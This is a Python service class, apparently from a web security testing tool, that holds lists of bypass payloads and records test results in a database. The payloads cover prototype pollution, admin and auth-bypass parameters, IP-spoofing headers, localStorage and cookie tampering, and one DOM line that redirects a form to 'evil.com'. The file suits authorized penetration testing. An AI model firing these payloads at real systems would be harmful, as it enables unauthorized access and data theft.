"""
Bypass Testing Service - Manage bypass test definitions and results
"""

import logging
import json
from typing import Dict, List, Optional, Any
from datetime import datetime

logger = logging.getLogger(__name__)


class BypassService:
    """Service untuk mengelola bypass testing definitions dan results"""

    def __init__(self, db):
        self.db = db
        self.test_definitions = self._load_test_definitions()
        logger.info("BypassService initialized")

    def _load_test_definitions(self) -> Dict[str, List[Dict]]:
        """Load pre-defined bypass test suites"""
        return {
            "parameter": [
                {"payload": "__proto__[test]=1", "description": "Prototype pollution"},
                {
                    "payload": "_method=DELETE",
                    "description": "Method override parameter",
                },
                {"payload": "admin=true", "description": "Privilege escalation"},
                {"payload": "debug=1", "description": "Debug mode activation"},
                {"payload": "test=true", "description": "Test mode bypass"},
                {"payload": "bypass=1", "description": "Direct bypass parameter"},
                {"payload": "override=true", "description": "Override protection"},
                {"payload": "force=1", "description": "Force execution"},
                {"payload": "confirm=false", "description": "Skip confirmation"},
                {"payload": "validate=false", "description": "Skip validation"},
                {"payload": "authenticated=true", "description": "Auth bypass"},
                {"payload": "role=admin", "description": "Role elevation"},
                {"payload": "unsafe=true", "description": "Unsafe mode"},
                {"payload": "skip_check=1", "description": "Skip security check"},
                {"payload": "no_csrf=1", "description": "CSRF bypass"},
            ],
            "header": [
                {
                    "header": "X-Forwarded-For: 127.0.0.1",
                    "description": "IP spoofing localhost",
                },
                {"header": "X-Original-URL: /admin", "description": "URL override"},
                {
                    "header": "X-Custom-IP-Authorization: 127.0.0.1",
                    "description": "Custom IP auth",
                },
                {
                    "header": "X-Forwarded-Host: localhost",
                    "description": "Host override",
                },
                {
                    "header": "X-Originating-IP: 127.0.0.1",
                    "description": "Origin IP spoof",
                },
                {
                    "header": "X-Remote-IP: 127.0.0.1",
                    "description": "Remote IP override",
                },
                {"header": "X-Client-IP: 127.0.0.1", "description": "Client IP spoof"},
                {"header": "X-Real-IP: 127.0.0.1", "description": "Real IP override"},
                {
                    "header": "X-HTTP-Method-Override: GET",
                    "description": "Method override header",
                },
                {
                    "header": "X-Method-Override: GET",
                    "description": "Alternative method override",
                },
                {
                    "header": "Authorization: Bearer null",
                    "description": "Null bearer token",
                },
                {
                    "header": "X-Auth-Token: admin",
                    "description": "Admin token injection",
                },
                {"header": "X-CSRF-Token: null", "description": "Null CSRF token"},
                {
                    "header": "Content-Type: application/json",
                    "description": "Content type override",
                },
                {"header": "Origin: null", "description": "Null origin"},
            ],
            "method": [
                {"method": "GET", "description": "GET method"},
                {"method": "POST", "description": "POST method"},
                {"method": "PUT", "description": "PUT method"},
                {"method": "PATCH", "description": "PATCH method"},
                {"method": "DELETE", "description": "DELETE method"},
                {"method": "OPTIONS", "description": "OPTIONS method"},
                {"method": "HEAD", "description": "HEAD method"},
                {"method": "CONNECT", "description": "CONNECT method"},
                {"method": "TRACE", "description": "TRACE method"},
                {"method": "TRACK", "description": "TRACK method"},
            ],
            "storage": [
                {
                    "storage": 'localStorage.setItem("admin", "true")',
                    "description": "Admin flag in localStorage",
                },
                {
                    "storage": 'localStorage.setItem("role", "administrator")',
                    "description": "Role elevation",
                },
                {
                    "storage": 'localStorage.setItem("authenticated", "true")',
                    "description": "Auth bypass",
                },
                {
                    "storage": 'localStorage.setItem("premium", "true")',
                    "description": "Premium access",
                },
                {
                    "storage": 'localStorage.setItem("verified", "true")',
                    "description": "Verification bypass",
                },
                {
                    "storage": 'sessionStorage.setItem("admin", "true")',
                    "description": "Admin in session",
                },
                {
                    "storage": 'sessionStorage.setItem("bypass", "true")',
                    "description": "Bypass flag",
                },
                {
                    "storage": 'document.cookie="admin=true"',
                    "description": "Admin cookie",
                },
                {
                    "storage": 'document.cookie="role=admin"',
                    "description": "Role cookie",
                },
                {
                    "storage": 'document.cookie="authenticated=true"',
                    "description": "Auth cookie",
                },
            ],
            "dom": [
                {
                    "dom": 'document.querySelector("button[disabled]").disabled=false',
                    "description": "Enable disabled button",
                },
                {
                    "dom": 'document.querySelector("input[readonly]").readOnly=false',
                    "description": "Enable readonly input",
                },
                {
                    "dom": 'document.querySelector("form").action="http://evil.com"',
                    "description": "Form action hijack",
                },
                {
                    "dom": 'document.querySelector(".premium-feature").style.display="block"',
                    "description": "Show hidden features",
                },
            ],
        }

    def get_test_suite(self, test_type: str) -> Dict[str, Any]:
        """Get bypass test suite by type"""
        try:
            tests = self.test_definitions.get(test_type, [])
            logger.debug(f"Retrieved {len(tests)} tests for type: {test_type}")
            return {
                "success": True,
                "test_type": test_type,
                "tests": tests,
                "total": len(tests),
            }
        except Exception as e:
            logger.error(f"Error getting test suite: {str(e)}", exc_info=True)
            raise

    def get_all_test_suites(self) -> Dict[str, Any]:
        """Get all available test suites"""
        try:
            total_tests = sum(len(tests) for tests in self.test_definitions.values())
            return {
                "success": True,
                "test_suites": self.test_definitions,
                "total_suites": len(self.test_definitions),
                "total_tests": total_tests,
            }
        except Exception as e:
            logger.error(f"Error getting all test suites: {str(e)}", exc_info=True)
            raise

    def store_test_result(self, test_data: Dict[str, Any]) -> Dict[str, Any]:
        """Store bypass test result"""
        try:
            query = """
                INSERT INTO bypass_results
                (test_type, payload, target_url, success, response_code,
                 response_body, error_message, execution_time, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            """

            # Limit response_body size
            response_body = test_data.get("response_body", "")
            if response_body and len(response_body) > 1000:
                response_body = response_body[:1000] + "... (truncated)"

            cursor = self.db.execute(
                query,
                (
                    test_data.get("test_type"),
                    test_data.get("payload", ""),
                    test_data.get("target_url", ""),
                    bool(test_data.get("success", False)),
                    test_data.get("response_code"),
                    response_body,
                    test_data.get("error_message"),
                    test_data.get("execution_time", 0),
                ),
            )

            result_id = cursor.lastrowid
            logger.info(
                f"Stored test result: ID={result_id}, type={test_data.get('test_type')}"
            )

            return {"success": True, "result_id": result_id}

        except Exception as e:
            logger.error(f"Error storing test result: {str(e)}", exc_info=True)
            raise

    def get_test_results(
        self, limit: int = 50, test_type: Optional[str] = None
    ) -> Dict[str, Any]:
        """Get recent test results"""
        try:
            if test_type:
                query = """
                    SELECT id, test_type, payload, target_url, success, 
                           response_code, execution_time, created_at
                    FROM bypass_results
                    WHERE test_type = ?
                    ORDER BY created_at DESC
                    LIMIT ?
                """
                cursor = self.db.execute(query, (test_type, limit))
            else:
                query = """
                    SELECT id, test_type, payload, target_url, success, 
                           response_code, execution_time, created_at
                    FROM bypass_results
                    ORDER BY created_at DESC
                    LIMIT ?
                """
                cursor = self.db.execute(query, (limit,))

            results = []
            for row in cursor.fetchall():
                results.append(
                    {
                        "id": row[0],
                        "test_type": row[1],
                        "payload": row[2],
                        "target_url": row[3],
                        "success": bool(row[4]),
                        "response_code": row[5],
                        "execution_time": row[6],
                        "created_at": row[7],
                    }
                )

            logger.debug(f"Retrieved {len(results)} test results")
            return {"success": True, "results": results, "total": len(results)}

        except Exception as e:
            logger.error(f"Error getting test results: {str(e)}", exc_info=True)
            raise

    def get_test_statistics(self) -> Dict[str, Any]:
        """Get bypass test statistics"""
        try:
            stats_query = """
                SELECT 
                    test_type,
                    COUNT(*) as total_tests,
                    SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as successful_tests,
                    AVG(execution_time) as avg_execution_time
                FROM bypass_results
                GROUP BY test_type
            """

            cursor = self.db.execute(stats_query)
            stats_by_type = {}

            for row in cursor.fetchall():
                test_type = row[0]
                stats_by_type[test_type] = {
                    "total_tests": row[1],
                    "successful_tests": row[2],
                    "success_rate": (row[2] / row[1] * 100) if row[1] > 0 else 0,
                    "avg_execution_time": round(row[3], 2) if row[3] else 0,
                }

            # Overall stats
            overall_query = """
                SELECT 
                    COUNT(*) as total_tests,
                    SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as successful_tests
                FROM bypass_results
            """
            cursor = self.db.execute(overall_query)
            row = cursor.fetchone()

            overall_stats = {
                "total_tests": row[0] if row else 0,
                "successful_tests": row[1] if row else 0,
                "success_rate": (row[1] / row[0] * 100) if (row and row[0] > 0) else 0,
            }

            return {
                "success": True,
                "overall": overall_stats,
                "by_type": stats_by_type,
            }

        except Exception as e:
            logger.error(f"Error getting test statistics: {str(e)}", exc_info=True)
            raise

    def export_results(
        self, format: str = "json", test_type: Optional[str] = None
    ) -> Dict[str, Any]:
        """Export test results"""
        try:
            results_data = self.get_test_results(limit=1000, test_type=test_type)

            if format == "json":
                export_data = json.dumps(results_data["results"], indent=2)
                return {"success": True, "format": "json", "data": export_data}

            elif format == "csv":
                import csv
                import io

                output = io.StringIO()
                if results_data["results"]:
                    writer = csv.DictWriter(
                        output, fieldnames=results_data["results"][0].keys()
                    )
                    writer.writeheader()
                    writer.writerows(results_data["results"])

                export_data = output.getvalue()
                return {"success": True, "format": "csv", "data": export_data}

            else:
                raise ValueError(f"Unsupported export format: {format}")

        except Exception as e:
            logger.error(f"Error exporting results: {str(e)}", exc_info=True)
            raise

    def delete_old_results(self, days: int = 30) -> Dict[str, Any]:
        """Delete test results older than specified days"""
        try:
            query = """
                DELETE FROM bypass_results
                WHERE created_at < datetime('now', '-' || ? || ' days')
            """
            cursor = self.db.execute(query, (days,))
            deleted_count = cursor.rowcount

            logger.info(
                f"Deleted {deleted_count} old test results (older than {days} days)"
            )
            return {"success": True, "deleted_count": deleted_count}

        except Exception as e:
            logger.error(f"Error deleting old results: {str(e)}", exc_info=True)
            raise
